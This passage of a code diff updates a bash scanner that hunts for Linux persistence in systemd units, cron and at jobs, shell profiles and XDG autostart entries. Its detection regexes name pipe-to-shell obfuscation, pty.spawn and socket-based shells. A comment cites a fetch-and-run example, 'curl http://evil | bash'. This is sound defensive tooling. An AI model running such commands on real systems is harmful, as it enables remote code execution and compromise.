         MATCHED_STRING=$(echo "$ansi_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
         return 0  # SUSPICIOUS - ANSI-C encoded payload
+    fi
+
+    # tr-based character substitution piped to execution (ROT13, ROT47, custom ciphers)
+    # Pattern: tr '...' '...' | bash/sh  — obfuscation via character rotation
+    local tr_exec_line
+    tr_exec_line=$(echo "$script_content_clean" | grep -iE "tr[[:space:]]+['\"].+['\"].*\|[[:space:]]*(bash|sh|dash|zsh|exec)" | head -1) || true
+    if [[ -n "$tr_exec_line" ]]; then
+        MATCHED_PATTERN="tr_cipher_obfuscation"
+        MATCHED_STRING=$(echo "$tr_exec_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
+        return 0  # SUSPICIOUS - tr cipher obfuscation piped to shell
+    fi
+
+    # rev-based string reversal piped to execution
+    local rev_exec_line
+    rev_exec_line=$(echo "$script_content_clean" | grep -iE "rev[[:space:]]*\|[[:space:]]*(bash|sh|dash|zsh)" | head -1) || true
+    if [[ -n "$rev_exec_line" ]]; then
+        MATCHED_PATTERN="rev_obfuscation"
+        MATCHED_STRING=$(echo "$rev_exec_line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | head -c 200)
+        return 0  # SUSPICIOUS - string reversal piped to shell
+    fi
+
+    # Language-specific network/exec patterns (Python, Perl, Ruby)
+    # These appear in scripts that use language stdlib instead of shell commands,
+    # making them invisible to shell-command pattern checks.
+    local lang_exec_line
+    lang_exec_line=$(echo "$script_content_clean" | grep -oE \
+        "socket\.connect\(|pty\.spawn\(|subprocess\.Popen[^)]{0,60}shell[[:space:]]*=[[:space:]]*True|os\.(system|popen|exec[vl]p?)\(|TCPSocket\.new\(" \
+        | head -1) || true
+    if [[ -n "$lang_exec_line" ]]; then
+        MATCHED_PATTERN="language_network_exec"
+        MATCHED_STRING="${lang_exec_line:0:200}"
+        return 0  # SUSPICIOUS - language-specific network or shell-execution pattern
     fi
 
     # Check for high-entropy strings (obfuscation detection)
@@ -976,35 +1246,28 @@ analyze_script_content() {
         [[ -z "$line" ]] && continue
 
         # Extract variable assignments with long values (potential obfuscation)
-        # Try to match quoted strings first (double quotes)
+        # ISC-C10 FIX: Only flag HIGH entropy when paired with an execution context indicator
+        # on the same line (eval, exec, base64 -d, bash, sh -c, openssl -d).
+        # Standalone high-entropy strings (certificates, UUIDs, API keys, hashes) are
+        # too noisy to flag without execution context — they don't continue the loop.
+        local _value=""
         if [[ "$line" =~ =\"([^\"]{30,})\" ]]; then
-            local value="${BASH_REMATCH[1]}"
-            if is_high_entropy "$value" 4.5; then
-                MATCHED_PATTERN="high_entropy"
-                MATCHED_STRING="${value:0:50}..."
-                return 0  # SUSPICIOUS - high entropy indicates obfuscation
-            fi
-        # Try single quoted strings
+            _value="${BASH_REMATCH[1]}"
         elif [[ "$line" =~ =\'([^\']{30,})\' ]]; then
-            local value="${BASH_REMATCH[1]}"
-            if is_high_entropy "$value" 4.5; then
-                MATCHED_PATTERN="high_entropy"
-                MATCHED_STRING="${value:0:50}..."
-                return 0  # SUSPICIOUS - high entropy indicates obfuscation
-            fi
-        # Fall back to unquoted strings without spaces
+            _value="${BASH_REMATCH[1]}"
         elif [[ "$line" =~ =([^[:space:]]{30,}) ]]; then
-            local value="${BASH_REMATCH[1]}"
-            # Remove surrounding quotes if present
-            value="${value#\"}"
-            value="${value#\'}"
-            value="${value%\"}"
-            value="${value%\'}"
-            if is_high_entropy "$value" 4.5; then
-                MATCHED_PATTERN="high_entropy"
-                MATCHED_STRING="${value:0:50}..."
-                return 0  # SUSPICIOUS - high entropy indicates obfuscation
+            _value="${BASH_REMATCH[1]}"
+            _value="${_value#[\"\']}"
+            _value="${_value%[\"\']}"
+        fi
+
+        if [[ -n "$_value" ]] && is_high_entropy "$_value" 4.5; then
+            if echo "$line" | grep -qiE 'eval|exec\b|base64.*-d|bash\b|sh -c|openssl.*-d'; then
+                MATCHED_PATTERN="high_entropy_exec"
+                MATCHED_STRING="${_value:0:50}..."
+                return 0  # SUSPICIOUS - high entropy data with execution context
             fi
+            # Standalone high entropy without execution context: skip (too many FPs)
         fi
 
     done <<< "$script_content"
@@ -1024,12 +1287,31 @@ analyze_inline_code() {
     # Extract the inline code from -c "..." or -e "..." patterns
     local inline_code=""
 
-    # Match -c 'code' or -c "code" or -e 'code' or -e "code"
-    if [[ "$full_command" =~ \ -[ce]\ +[\"\'](.+)[\"\'] ]]; then
+    # BUG-5 fix: match same-type quotes to avoid greedy cross-section capture.
+    # Old pattern [\"\'](.+)[\"\'] was greedy and would match from the first quote
+    # to the LAST quote anywhere in the string, capturing unrelated trailing args.
+    # e.g. python3 -c 'code' "argv0" → old captured: code' "argv0  (wrong)
+    #
+    # BUG-6 fix: unquoted fallback now captures to end-of-string, not just one word.
+    # Old pattern ([^\ ]+) captured only the first word.
+    # e.g. bash -c echo foo → old captured: echo  (wrong, missed: foo)
+
+    # Store quote-containing patterns in variables to avoid bash parser misinterpretation
+    local _sq_pat="[[:space:]]-[ce][[:space:]]+'([^']+)'"
+    local _dq_pat='[[:space:]]-[ce][[:space:]]+"([^"]+)"'
+
+    # Try single-quoted form: -c 'code content here'
+    if [[ "$full_command" =~ $_sq_pat ]]; then
         inline_code="${BASH_REMATCH[1]}"
-    elif [[ "$full_command" =~ \ -[ce]\ +([^\ ]+) ]]; then
-        # Unquoted inline code
+    # Try double-quoted form: -c "code content here"
+    elif [[ "$full_command" =~ $_dq_pat ]]; then
         inline_code="${BASH_REMATCH[1]}"
+    # Unquoted fallback: capture everything to end of string after -c/-e
+    elif [[ "$full_command" =~ [[:space:]]-[ce][[:space:]]+(.+)$ ]]; then
+        inline_code="${BASH_REMATCH[1]}"
+        # Strip any leading/trailing quotes that might have been included
+        inline_code="${inline_code#[\"\']}"
+        inline_code="${inline_code%[\"\']}"
     fi
 
     [[ -z "$inline_code" ]] && return 1  # No inline code found
@@ -1095,63 +1377,6 @@ analyze_inline_code() {
     return 1  # Clean
 }
 
-# Check if command is executing a known-safe system binary
-is_command_safe() {
-    local command="$1"
-
-    # First check: Does it contain NEVER_WHITELIST patterns?
-    # Uses pre-built combined pattern for O(1) instead of O(n) grep calls
-    if [[ -n "$COMBINED_NEVER_WHITELIST_PATTERN" ]]; then
-        if echo "$command" | grep -qiE "$COMBINED_NEVER_WHITELIST_PATTERN"; then
-            return 1  # DANGEROUS - never whitelist
-        fi
-    fi
-
-    # Extract executable for subsequent checks
-    local executable=$(get_executable_from_command "$command")
-
-    # Second check: Path-based validation (uses pre-built combined pattern)
-    # A path is only safe if it's BOTH in a standard location AND package-managed
-    if [[ -n "$COMBINED_KNOWN_GOOD_PATHS_PATTERN" ]]; then
-        if echo "$command" | grep -qE "$COMBINED_KNOWN_GOOD_PATHS_PATTERN"; then
-            # Path matches known-good location, but we MUST verify it's package-managed
-            if [[ -n "$executable" ]] && [[ -f "$executable" ]]; then
-                local pkg_status pkg_return=0
-                pkg_status=$(is_package_managed "$executable") || pkg_return=$?
-
-                if [[ $pkg_return -eq 0 ]]; then
-                    return 0  # Safe - standard path AND package-managed
-                elif [[ $pkg_return -eq 2 ]]; then
-                    return 1  # DANGEROUS - modified package file
-                fi
-                # If pkg_return=1 (unmanaged), continue checking
-            fi
-        fi
-    fi
-
-    # Third check: Does it match known-good command patterns?
-    # Note: This array is small (~10) and patterns are simple, loop is acceptable
-    for pattern in "${KNOWN_GOOD_COMMAND_PATTERNS[@]}"; do
-        if echo "$command" | grep -qE "$pattern"; then
-            return 0  # Safe - benign command pattern
-        fi
-    done
-
-    # Fourth check: Is the executable itself package-managed (even if not in standard path)?
-    # Example: /opt/vendor/bin/tool that IS package-managed
-    if [[ -n "$executable" ]] && [[ -f "$executable" ]]; then
-        local pkg_status pkg_return=0
-        pkg_status=$(is_package_managed "$executable") || pkg_return=$?
-
-        if [[ $pkg_return -eq 0 ]]; then
-            return 0  # Safe - package-managed binary
-        elif [[ $pkg_return -eq 2 ]]; then
-            return 1  # DANGEROUS - modified package file
-        fi
-    fi
-
-    return 1  # Unknown/suspicious command
-}
 
 # Adjust confidence based on package management status
 adjust_confidence_for_package() {
@@ -1241,15 +1466,21 @@ escape_json() {
 }
 
 # Extract owner from metadata string
+# Metadata format: mode:xxx|owner:user:group|size:xxx|...
 get_owner_from_metadata() {
     local metadata="$1"
-    echo "$metadata" | grep -oP 'owner:\K[^|]+' || echo "N/A"
+    local tmp="${metadata#*owner:}"
+    # If pattern not found (e.g. metadata="N/A"), tmp == metadata — return N/A
+    [[ "$tmp" == "$metadata" ]] && echo "N/A" && return
+    echo "${tmp%%|*}"
 }
 
 # Extract permissions from metadata string
 get_permissions_from_metadata() {
     local metadata="$1"
-    echo "$metadata" | grep -oP 'mode:\K[^|]+' || echo "N/A"
+    local tmp="${metadata#*mode:}"
+    [[ "$tmp" == "$metadata" ]] && echo "N/A" && return
+    echo "${tmp%%|*}"
 }
 
 # Add finding to output (new structured format)
@@ -1268,6 +1499,15 @@ add_finding_new() {
     local description="${11:-}"
     local matched_pattern="${12:-}"    # The pattern that triggered detection
     local matched_string="${13:-}"     # The actual string that matched
+
+    # ISC-C8 FIX: Escalate HIGH → CRITICAL for SUID/SGID files with suspicious content.
+    # SUID/SGID + suspicious patterns is the most dangerous persistence combination:
+    # an attacker-controlled setuid binary that spawns a shell or downloads a payload.
+    # Permissions field format: "rwsr-xr-x" or "rws--x--x" etc. (s in user/group position).
+    if [[ "$confidence" == "HIGH" ]] && [[ "$file_permissions" =~ [sS] ]]; then
+        confidence="CRITICAL"
+        matched_pattern="${matched_pattern}+suid_sgid"
+    fi
 
     # Check if this finding should be included based on filter settings
     local has_suspicious="false"
@@ -1444,9 +1684,10 @@ check_systemd() {
                 local package_status="unmanaged"
                 local skip_pattern_analysis=false
 
-                # Check modification time of service file
-                local mod_time=$(stat -c %Y "$service_file" 2>/dev/null || stat -f %m "$service_file" 2>/dev/null || echo "0")
-                local current_time=$(date +%s)
+                # Check modification time — extract from already-fetched metadata (no extra stat fork)
+                local mod_time=0
+                [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                local current_time=$SCAN_EPOCH
                 local days_old=$(( (current_time - mod_time) / 86400 ))
 
                 # Only analyze ExecStart if it exists
@@ -1459,6 +1700,13 @@ check_systemd() {
                     # The .service file is just config - the forensic artifact
                     # is what actually gets executed
                     # ═══════════════════════════════════════════════════════════
+
+                    # Pre-check: NEVER_WHITELIST patterns on the full ExecStart line.
+                    # This prevents the package-verification bypass: a verified system binary
+                    # (e.g. /usr/bin/curl) executing with a pipe-to-shell pattern would
+                    # otherwise set skip_pattern_analysis=true and get confidence=LOW.
+                    local exec_never_wl_match=""
+                    exec_never_wl_match=$(echo "$exec_start" | grep -oE "$COMBINED_NEVER_WHITELIST_PATTERN" | head -1) || true
 
                     executable=$(get_executable_from_command "$exec_start")
 
@@ -1483,9 +1731,18 @@ check_systemd() {
                                     finding_matched_string="$script_to_analyze"
                                     log_finding "Interpreter script is modified package file: $script_to_analyze"
                                 elif [[ "$script_pkg_status" != "unmanaged" ]]; then
-                                    # Script is package-managed and verified - LOW, skip analysis
-                                    confidence="LOW"
-                                    skip_pattern_analysis=true
+                                    # Script is package-managed and verified
+                                    if [[ -n "$exec_never_wl_match" ]]; then
+                                        # ExecStart contains a NEVER_WHITELIST pattern — always flag
+                                        # regardless of the script's package status
+                                        confidence="HIGH"
+                                        finding_matched_pattern="never_whitelist"
+                                        finding_matched_string="$exec_never_wl_match"
+                                        log_finding "Systemd service: package-verified script with never-whitelist pattern: $exec_never_wl_match"
+                                    else
+                                        confidence="LOW"
+                                        skip_pattern_analysis=true
+                                    fi
                                 else
                                     # Script is UNMANAGED - analyze content
                                     if is_script "$script_to_analyze"; then
@@ -1498,10 +1755,14 @@ check_systemd() {
                                     fi
 
                                     # Check location-based suspicion
+                                    # BUG-8 fix: only set finding_matched_pattern if not already set
+                                    # by the content analysis above (preserve the more specific finding)
                                     if [[ "$script_to_analyze" =~ ^/(tmp|dev/shm|var/tmp) ]]; then
                                         confidence="HIGH"
-                                        finding_matched_pattern="suspicious_location"
-                                        finding_matched_string="$script_to_analyze"
+                                        if [[ -z "$finding_matched_pattern" ]]; then
+                                            finding_matched_pattern="suspicious_location"
+                                            finding_matched_string="$script_to_analyze"
+                                        fi
                                         log_finding "Interpreter executing script from suspicious location: $script_to_analyze"
                                     elif [[ "$script_to_analyze" =~ ^/(opt|usr/local|home) ]]; then
                                         # Common but unmanaged locations
@@ -1567,10 +1828,19 @@ check_systemd() {
                                 log_finding "Systemd service executes modified package file: $executable"
 
                             elif [[ "$exec_pkg_status" != "unmanaged" ]]; then
-                                # Binary is package-managed and verified - LOW, skip analysis
-                                confidence="LOW"
-                                skip_pattern_analysis=true
-                                package_status="$exec_pkg_status"
+                                # Binary is package-managed and verified
+                                if [[ -n "$exec_never_wl_match" ]]; then
+                                    # ExecStart contains a NEVER_WHITELIST pattern — always flag
+                                    # regardless of the binary's package status
+                                    confidence="HIGH"
+                                    finding_matched_pattern="never_whitelist"
+                                    finding_matched_string="$exec_never_wl_match"
+                                    log_finding "Systemd service: package-verified binary with never-whitelist pattern: $exec_never_wl_match"
+                                else
+                                    confidence="LOW"
+                                    skip_pattern_analysis=true
+                                    package_status="$exec_pkg_status"
+                                fi
 
                             else
                                 # UNMANAGED binary - need pattern analysis
@@ -1804,6 +2074,21 @@ analyze_cron_command() {
 
     [[ -z "$cron_command" ]] && return 1
 
+    # DEFLOW-2 fix: check the raw command for suspicious patterns BEFORE checking executable
+    # existence. Catches: "curl http://evil | bash", pipe-to-shell patterns, NEVER_WHITELIST
+    # hits that would otherwise be silently skipped when the executable is a package-managed
+    # binary like /usr/bin/curl or /usr/bin/wget.
+    if [[ -n "$COMBINED_NEVER_WHITELIST_PATTERN" ]]; then
+        if echo "$cron_command" | grep -qiE "$COMBINED_NEVER_WHITELIST_PATTERN"; then
+            CRON_ANALYSIS_REASON="dangerous_pattern:$(echo "$cron_command" | grep -oiE "$COMBINED_NEVER_WHITELIST_PATTERN" | head -1)"
+            return 0
+        fi
+    fi
+    if quick_suspicious_check "$cron_command"; then
+        CRON_ANALYSIS_REASON="suspicious_pattern:$MATCHED_STRING"
+        return 0
+    fi
+
     local executable
     executable=$(get_executable_from_command "$cron_command")
 
@@ -1861,6 +2146,13 @@ analyze_cron_command() {
         else
             # No script file - check for INLINE CODE (-c/-e flags)
             if [[ "$cron_command" =~ \ -[ce]\  ]] || [[ "$cron_command" =~ \ -[ce]$ ]]; then
+                # FLOW-3 fix: check if the interpreter ITSELF is in a suspicious location
+                # (e.g. /tmp/bash -c 'code' should flag the interpreter, not just the code)
+                if [[ "$executable" =~ ^/(tmp|dev/shm|var/tmp) ]] || [[ "$executable" =~ /\.[a-z] ]]; then
+                    CRON_ANALYSIS_REASON="suspicious_interpreter_location:$executable"
+                    return 0
+                fi
+
                 # Analyze the inline code content for patterns and obfuscation
                 if analyze_inline_code "$cron_command"; then
                     CRON_ANALYSIS_REASON="inline_code_suspicious:$INLINE_CODE_REASON"
@@ -1914,7 +2206,11 @@ analyze_cron_command() {
     fi
 
     # If it's a script file, analyze content
-    if is_script "$executable"; then
+    # BUG-7 fix: cache is_script() result to avoid calling it twice (2 subprocesses each time)
+    local _is_script=false
+    is_script "$executable" && _is_script=true
+
+    if $_is_script; then
         if analyze_script_content "$executable"; then
             # Include the actual suspicious content found
             CRON_ANALYSIS_REASON="suspicious_script_content:$MATCHED_STRING"
@@ -1924,7 +2220,7 @@ analyze_cron_command() {
 
     # Unmanaged binary but no suspicious content - show preview if script
     local preview=""
-    if is_script "$executable"; then
+    if $_is_script; then
         preview=$(grep -Ev "^#|^$" "$executable" 2>/dev/null | head -3 | tr '\n' ' ' | head -c 150) || true
     fi
     CRON_ANALYSIS_REASON="unmanaged_binary:${preview:-$executable}"
@@ -2103,10 +2399,10 @@ check_cron() {
                     log_finding "Cron script is MODIFIED package file: $cron_script"
                 else
                     # UNMANAGED script - analyze content
-                    local mod_time
-                    mod_time=$(stat -c %Y "$cron_script" 2>/dev/null || stat -f %m "$cron_script" 2>/dev/null || echo "0")
-                    local current_time
-                    current_time=$(date +%s)
+                    # Extract mod_time from already-fetched metadata (no extra stat fork)
+                    local mod_time=0
+                    [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                    local current_time=$SCAN_EPOCH
                     local days_old=$(( (current_time - mod_time) / 86400 ))
 
                     if [[ $days_old -lt 7 ]]; then
@@ -2138,20 +2434,39 @@ check_cron() {
     done
 
     # User crontabs
+    # Analyze each entry with the full execution chain (same flow as /etc/crontab and /etc/cron.d)
     if [[ $EUID_CHECK -eq 0 ]]; then
         while IFS=: read -r username _ uid _; do
             if [[ $uid -ge 1000 ]] || [[ $uid -eq 0 ]]; then
-                local user_cron=$(crontab -u "$username" -l 2>/dev/null || echo "")
+                local user_cron
+                user_cron=$(crontab -u "$username" -l 2>/dev/null || echo "")
                 if [[ -n "$user_cron" ]]; then
                     local confidence="MEDIUM"
                     local finding_matched_pattern=""
                     local finding_matched_string=""
-                    if quick_suspicious_check "$user_cron"; then
-                        confidence="HIGH"
-                        finding_matched_pattern="$MATCHED_PATTERN"
-                        finding_matched_string="$MATCHED_STRING"
-                        log_finding "Suspicious user crontab for: $username"
-                    fi
+
+                    while IFS= read -r cron_line; do
+                        # Skip comments, empty lines, and variable assignments
+                        [[ "$cron_line" =~ ^[[:space:]]*# ]] && continue
+                        [[ -z "${cron_line//[[:space:]]/}" ]] && continue
+                        [[ "$cron_line" =~ ^[A-Z_]+= ]] && continue
+
+                        # Extract command column: @special uses field 2+, timed entries field 6+
+                        local cron_command
+                        if [[ "$cron_line" =~ ^@ ]]; then
+                            cron_command=$(echo "$cron_line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}') || true
+                        else
+                            cron_command=$(echo "$cron_line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}') || true
+                        fi
+                        cron_command="${cron_command%"${cron_command##*[![:space:]]}"}"  # rtrim
+
+                        if analyze_cron_command "$cron_command" "/var/spool/cron/crontabs/$username"; then
+                            [[ "$confidence" != "CRITICAL" ]] && confidence="HIGH"
+                            finding_matched_pattern="${CRON_ANALYSIS_REASON%%:*}"
+                            finding_matched_string="${CRON_ANALYSIS_REASON#*:}"
+                            log_finding "User crontab entry suspicious ($CRON_ANALYSIS_REASON): $username"
+                        fi
+                    done <<< "$user_cron"
 
                     add_finding "Cron" "User" "user_crontab" "/var/spool/cron/crontabs/$username" "User $username crontab entries" "$confidence" "N/A" "user=$username" "preview=${user_cron:0:100}" "$finding_matched_pattern" "$finding_matched_string"
                 fi
@@ -2159,15 +2474,35 @@ check_cron() {
         done < /etc/passwd
     else
         # Non-root: check only current user
-        local user_cron=$(crontab -l 2>/dev/null || echo "")
+        local user_cron
+        user_cron=$(crontab -l 2>/dev/null || echo "")
         if [[ -n "$user_cron" ]]; then
+            local confidence="MEDIUM"
             local finding_matched_pattern=""
             local finding_matched_string=""
-            if quick_suspicious_check "$user_cron"; then
-                finding_matched_pattern="$MATCHED_PATTERN"
-                finding_matched_string="$MATCHED_STRING"
-            fi
-            add_finding "Cron" "User" "user_crontab" "~/.crontab" "Current user crontab" "MEDIUM" "N/A" "user=$(whoami)" "preview=${user_cron:0:100}" "$finding_matched_pattern" "$finding_matched_string"
+
+            while IFS= read -r cron_line; do
+                [[ "$cron_line" =~ ^[[:space:]]*# ]] && continue
+                [[ -z "${cron_line//[[:space:]]/}" ]] && continue
+                [[ "$cron_line" =~ ^[A-Z_]+= ]] && continue
+
+                local cron_command
+                if [[ "$cron_line" =~ ^@ ]]; then
+                    cron_command=$(echo "$cron_line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}') || true
+                else
+                    cron_command=$(echo "$cron_line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}') || true
+                fi
+                cron_command="${cron_command%"${cron_command##*[![:space:]]}"}"
+
+                if analyze_cron_command "$cron_command" "~/.crontab"; then
+                    [[ "$confidence" != "CRITICAL" ]] && confidence="HIGH"
+                    finding_matched_pattern="${CRON_ANALYSIS_REASON%%:*}"
+                    finding_matched_string="${CRON_ANALYSIS_REASON#*:}"
+                    log_finding "User crontab entry suspicious ($CRON_ANALYSIS_REASON): $(whoami)"
+                fi
+            done <<< "$user_cron"
+
+            add_finding "Cron" "User" "user_crontab" "~/.crontab" "Current user crontab" "$confidence" "N/A" "user=$(whoami)" "preview=${user_cron:0:100}" "$finding_matched_pattern" "$finding_matched_string"
         fi
     fi
 
@@ -2191,12 +2526,21 @@ check_cron() {
                 local confidence="LOW"
                 local finding_matched_pattern=""
                 local finding_matched_string=""
-                if quick_suspicious_check "$job_details"; then
-                    confidence="HIGH"
-                    finding_matched_pattern="$MATCHED_PATTERN"
-                    finding_matched_string="$MATCHED_STRING"
-                    log_finding "Suspicious at job: $job_id"
-                fi
+
+                # Analyze each command line with full execution chain
+                while IFS= read -r at_line; do
+                    [[ -z "${at_line//[[:space:]]/}" ]] && continue
+                    [[ "$at_line" =~ ^[[:space:]]*# ]] && continue
+                    # Skip shell environment preamble lines from at -c output
+                    [[ "$at_line" =~ ^(export |umask |cd |eval |typeset ) ]] && continue
+
+                    if analyze_cron_command "$at_line" "/var/spool/at/$job_id"; then
+                        [[ "$confidence" != "HIGH" ]] && confidence="HIGH"
+                        finding_matched_pattern="${CRON_ANALYSIS_REASON%%:*}"
+                        finding_matched_string="${CRON_ANALYSIS_REASON#*:}"
+                        log_finding "Suspicious at job $job_id ($CRON_ANALYSIS_REASON)"
+                    fi
+                done <<< "$job_details"
 
                 add_finding "Scheduled" "At" "at_job" "/var/spool/at/$job_id" "At job $job_id" "$confidence" "N/A" "$job_line" "job_id=$job_id" "$finding_matched_pattern" "$finding_matched_string"
             done <<< "$at_jobs"
@@ -2254,14 +2598,21 @@ check_cron() {
                     fi
                 fi
 
-                if quick_suspicious_check "$content"; then
-                    [[ "$confidence" != "HIGH" ]] && confidence="HIGH"
-                    if [[ -z "$finding_matched_pattern" ]] || [[ "$in_atq" == "true" ]]; then
-                        finding_matched_pattern="$MATCHED_PATTERN"
-                        finding_matched_string="$MATCHED_STRING"
+                # Analyze each command line with full execution chain
+                while IFS= read -r spool_line; do
+                    [[ -z "${spool_line//[[:space:]]/}" ]] && continue
+                    [[ "$spool_line" =~ ^[[:space:]]*# ]] && continue
+                    [[ "$spool_line" =~ ^(export |umask |cd |eval |typeset ) ]] && continue
+
+                    if analyze_cron_command "$spool_line" "$spool_file"; then
+                        [[ "$confidence" != "HIGH" ]] && confidence="HIGH"
+                        if [[ -z "$finding_matched_pattern" ]] || [[ "$in_atq" == "true" ]]; then
+                            finding_matched_pattern="${CRON_ANALYSIS_REASON%%:*}"
+                            finding_matched_string="${CRON_ANALYSIS_REASON#*:}"
+                        fi
+                        log_finding "Suspicious content in at spool file: $spool_file"
                     fi
-                    log_finding "Suspicious content in at spool file: $spool_file"
-                fi
+                done <<< "$content"
 
                 # Only report if not already reported via atq (avoid duplicates for visible jobs)
                 if [[ "$in_atq" == "false" ]]; then
@@ -2353,7 +2704,18 @@ check_shell_profiles() {
                 package_status=$(is_package_managed "$profile") || true
                 confidence=$(adjust_confidence_for_package "$confidence" "$package_status")
 
-                add_finding "ShellProfile" "System" "profile_file" "$profile" "System shell profile" "$confidence" "$hash" "$metadata" "package=$package_status" "$finding_matched_pattern" "$finding_matched_string"
+                # ISC-C5 FIX: Time-based elevation for recently modified profiles
+                local mod_time=0
+                [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                local days_old=$(( (SCAN_EPOCH - mod_time) / 86400 ))
+                if [[ $days_old -lt 7 ]] && [[ "$confidence" == "MEDIUM" ]]; then
+                    confidence="HIGH"
+                    finding_matched_pattern="${finding_matched_pattern:-recent_modification}"
+                    finding_matched_string="${finding_matched_string:-${days_old} days old}"
+                    log_finding "Recently modified system profile: $profile (${days_old} days old)"
+                fi
+
+                add_finding "ShellProfile" "System" "profile_file" "$profile" "System shell profile" "$confidence" "$hash" "$metadata" "days_old=${days_old};package=$package_status" "$finding_matched_pattern" "$finding_matched_string"
 
             elif [[ -d "$profile" ]]; then
                 while IFS= read -r -d '' profile_file; do
@@ -2381,7 +2743,18 @@ check_shell_profiles() {
                     package_status=$(is_package_managed "$profile_file") || true
                     confidence=$(adjust_confidence_for_package "$confidence" "$package_status")
 
-                    add_finding "ShellProfile" "System" "profile_script" "$profile_file" "Profile.d script: $(basename "$profile_file")" "$confidence" "$hash" "$metadata" "package=$package_status" "$finding_matched_pattern" "$finding_matched_string"
+                    # ISC-C5 FIX: Time-based elevation for recently modified profile.d scripts
+                    local mod_time=0
+                    [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                    local days_old=$(( (SCAN_EPOCH - mod_time) / 86400 ))
+                    if [[ $days_old -lt 7 ]] && [[ "$confidence" == "MEDIUM" ]]; then
+                        confidence="HIGH"
+                        finding_matched_pattern="${finding_matched_pattern:-recent_modification}"
+                        finding_matched_string="${finding_matched_string:-${days_old} days old}"
+                        log_finding "Recently modified profile.d script: $profile_file (${days_old} days old)"
+                    fi
+
+                    add_finding "ShellProfile" "System" "profile_script" "$profile_file" "Profile.d script: $(basename "$profile_file")" "$confidence" "$hash" "$metadata" "days_old=${days_old};package=$package_status" "$finding_matched_pattern" "$finding_matched_string"
 
                 done < <(find "$profile" -type f -print0 2>/dev/null)
             fi
@@ -2427,7 +2800,23 @@ check_shell_profiles() {
                             log_finding "User profile contains suspicious patterns: $profile_path (user: $username)"
                         fi
 
-                        add_finding "ShellProfile" "User" "user_profile" "$profile_path" "User profile for $username" "$confidence" "$hash" "$metadata" "user=$username" "$finding_matched_pattern" "$finding_matched_string"
+                        # DEFLOW-3: Check package status — catches modified system-managed dotfiles (e.g., /root/.bashrc)
+                        local package_status
+                        package_status=$(is_package_managed "$profile_path") || true
+                        confidence=$(adjust_confidence_for_package "$confidence" "$package_status")
+
+                        # ISC-C5 FIX: Time-based elevation for recently modified user profiles
+                        local mod_time=0
+                        [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                        local days_old=$(( (SCAN_EPOCH - mod_time) / 86400 ))
+                        if [[ $days_old -lt 7 ]] && [[ "$confidence" == "MEDIUM" ]]; then
+                            confidence="HIGH"
+                            finding_matched_pattern="${finding_matched_pattern:-recent_modification}"
+                            finding_matched_string="${finding_matched_string:-${days_old} days old}"
+                            log_finding "Recently modified user profile: $profile_path (${days_old} days old, user: $username)"
+                        fi
+
+                        add_finding "ShellProfile" "User" "user_profile" "$profile_path" "User profile for $username" "$confidence" "$hash" "$metadata" "days_old=${days_old};user=$username;package=$package_status" "$finding_matched_pattern" "$finding_matched_string"
                     fi
                 done
             fi
@@ -2454,7 +2843,23 @@ check_shell_profiles() {
                     finding_matched_string="$MATCHED_STRING"
                 fi
 
-                add_finding "ShellProfile" "User" "user_profile" "$profile_path" "Current user profile" "$confidence" "$hash" "$metadata" "user=$(whoami)" "$finding_matched_pattern" "$finding_matched_string"
+                # DEFLOW-3: Check package status — catches modified system-managed dotfiles
+                local package_status
+                package_status=$(is_package_managed "$profile_path") || true
+                confidence=$(adjust_confidence_for_package "$confidence" "$package_status")
+
+                # ISC-C5 FIX: Time-based elevation for recently modified non-root user profiles
+                local mod_time=0
+                [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                local days_old=$(( (SCAN_EPOCH - mod_time) / 86400 ))
+                if [[ $days_old -lt 7 ]] && [[ "$confidence" == "MEDIUM" ]]; then
+                    confidence="HIGH"
+                    finding_matched_pattern="${finding_matched_pattern:-recent_modification}"
+                    finding_matched_string="${finding_matched_string:-${days_old} days old}"
+                    log_finding "Recently modified user profile: $profile_path (${days_old} days old)"
+                fi
+
+                add_finding "ShellProfile" "User" "user_profile" "$profile_path" "Current user profile" "$confidence" "$hash" "$metadata" "days_old=${days_old};user=$(whoami);package=$package_status" "$finding_matched_pattern" "$finding_matched_string"
             fi
         done
     fi
@@ -2920,11 +3325,140 @@ check_additional_persistence() {
                 local confidence="LOW"
                 local finding_matched_pattern=""
                 local finding_matched_string=""
-                if quick_suspicious_check "$exec_line"; then
-                    confidence="HIGH"
-                    finding_matched_pattern="$MATCHED_PATTERN"
-                    finding_matched_string="$MATCHED_STRING"
-                    log_finding "Suspicious XDG autostart: $desktop_file"
+                local skip_pattern_analysis=false
+
+                if [[ -n "$exec_line" ]]; then
+                    # Pre-check: NEVER_WHITELIST patterns on the full Exec= line.
+                    # Prevents package-verification bypass (same logic as check_systemd).
+                    local xdg_never_wl_match=""
+                    xdg_never_wl_match=$(echo "$exec_line" | grep -oE "$COMBINED_NEVER_WHITELIST_PATTERN" | head -1) || true
+
+                    local xdg_executable
+                    xdg_executable=$(get_executable_from_command "$exec_line") || true
+
+                    if [[ -n "$xdg_executable" ]] && [[ -f "$xdg_executable" ]]; then
+
+                        if is_interpreter "$xdg_executable"; then
+                            # BRANCH 1: Interpreter — analyze the script target, not the interpreter
+                            local xdg_script
+                            xdg_script=$(get_script_from_interpreter_command "$exec_line") || true
+
+                            if [[ -n "$xdg_script" ]] && [[ -f "$xdg_script" ]]; then
+                                local script_pkg_status
+                                script_pkg_status=$(is_package_managed "$xdg_script") || true
+
+                                if [[ "$script_pkg_status" == *":MODIFIED" ]]; then
+                                    confidence="CRITICAL"
+                                    finding_matched_pattern="modified_script"
+                                    finding_matched_string="$xdg_script"
